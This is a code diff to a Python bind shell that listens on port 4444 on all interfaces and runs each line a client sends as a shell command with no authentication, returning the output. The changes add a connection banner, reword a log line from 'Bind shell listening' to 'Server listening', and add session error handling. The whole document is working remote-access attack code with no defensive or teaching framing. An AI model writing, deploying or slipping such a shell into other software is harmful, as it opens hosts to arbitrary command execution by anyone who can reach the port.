@@ -23,12 +23,13 @@ import subprocess
 
 PORT = 4444
 TIMEOUT = 10
+BANNER = "Connected to the Python bind shell server.\nType your command (or 'exit' to disconnect)\n"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind(('0.0.0.0', PORT))
 s.listen(1)
-print(f"Bind shell listening on port {PORT} with timeout {TIMEOUT}s")
+print(f"Server listening on port {PORT} with timeout {TIMEOUT}s")
 
 while True:
     conn, addr = s.accept()
@@ -37,24 +38,29 @@ while True:
     print(f"Connection established from {client_ip}:{client_port}")
     
     with conn, conn.makefile('r', encoding='utf-8', errors='ignore') as f:
-        for cmd in f:
-            cmd = cmd.strip()
-            if not cmd: 
-                continue
-            if cmd.lower() == 'exit': 
-                print(f"Connection from {client_ip}:{client_port} closed by client")
-                break
+        try:
             
-            try:
-                out = subprocess.run(cmd, shell=True, capture_output=True, timeout=TIMEOUT)
-                response = out.stdout + out.stderr
+            conn.sendall(BANNER.encode('utf-8'))
+            for cmd in f:
+                cmd = cmd.strip()
+                if not cmd: 
+                    continue
+                if cmd.lower() == 'exit': 
+                    print(f"Client {client_ip}:{client_port} disconnected.")
+                    break
                 
-                if not response:
-                    conn.sendall(b"\n")
-                else:
-                    conn.sendall(response)
+                try:
+                    out = subprocess.run(cmd, shell=True, capture_output=True, timeout=TIMEOUT)
+                    response = out.stdout + out.stderr
                     
-            except subprocess.TimeoutExpired:
-                conn.sendall(f"Error: Command timed out after {TIMEOUT}s\n".encode())
-            except Exception as e:
-                conn.sendall(f"Error: {str(e)}\n".encode())
+                    if not response:
+                        conn.sendall(b"\n")
+                    else:
+                        conn.sendall(response)
+                        
+                except subprocess.TimeoutExpired:
+                    conn.sendall(f"Error: Command timed out after {TIMEOUT}s\n".encode())
+                except Exception as e:
+                    conn.sendall(f"Error: {str(e)}\n".encode())
+        except Exception as e:
+            print(f"Session error with {client_ip}: {str(e)}")
